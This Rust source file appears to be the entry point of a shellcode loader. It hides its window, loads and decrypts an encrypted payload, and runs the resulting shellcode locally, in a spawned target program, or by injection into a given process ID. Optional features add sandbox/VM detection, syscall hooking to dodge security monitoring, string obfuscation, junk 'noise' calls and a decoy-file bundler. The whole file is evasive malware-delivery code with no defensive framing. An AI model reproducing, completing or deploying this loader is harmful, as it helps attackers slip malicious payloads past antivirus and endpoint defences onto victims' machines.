#![windows_subsystem = "windows"]
mod utils;
mod load_payload;
use utils::obfuscation_noise;
mod exec;
mod decrypt;
mod alloc_mem;
mod decode;

use std::process;
use rustcrypt_ct_macros::obf_lit;
use load_payload::load_payload;
use decrypt::decrypt;
use decode::decode_payload;
use exec::exec;

#[cfg(feature = "with_forgery")]
mod forgery;

#[cfg(feature = "sandbox")]
mod guard;

#[cfg(feature = "veh_syscall")]
use rust_veh_syscalls::{initialize_hooks, destroy_hooks};


fn main() {
    #[cfg(feature = "veh_syscall")]
    initialize_hooks();

    #[cfg(feature = "sandbox")]
    guard::guard_vm();

    obfuscation_noise();

    #[cfg(feature = "with_forgery")]
    forgery::bundle::bundlefile();
    
    let encrypted_data = match load_payload() {
        Ok(data) => data,
        Err(e) => {
            println!("{} {}", obf_lit!("Failed:"), e);
            process::exit(1);
        }
    };

    let decrypted_data = decode_payload(&encrypted_data).unwrap();

    obfuscation_noise();

    unsafe {
        let (shellcode_ptr, _shellcode_len) = match decrypt(&decrypted_data) {
            Ok(p) => p,
            Err(e) => {
                println!("{} {}", obf_lit!("Failed to decrypt:"), e);
                process::exit(1);
            }
        };
        
        obfuscation_noise();

        #[cfg(feature = "pattern1")]
        if let Err(e) = exec(shellcode_ptr as usize) {
            println!("{} {}", obf_lit!("Failed to execute:"), e);
            process::exit(1);
        }
        
        #[cfg(feature = "pattern2")] 
        {
            let target_program = env!("RSL_TARGET_PROGRAM");
            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, target_program) {
                println!("{} {}", "Failed to execute:", e);
                process::exit(1);
            }
        }
        
        #[cfg(feature = "pattern3")]
        {
            let pid: usize = env!("RSL_TARGET_PID").parse().unwrap_or(0);
            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, pid) {
                println!("{} {}", "Failed to execute:", e);
                process::exit(1);
            }
        }
        
    }

    #[cfg(feature = "veh_syscall")]
    destroy_hooks();
}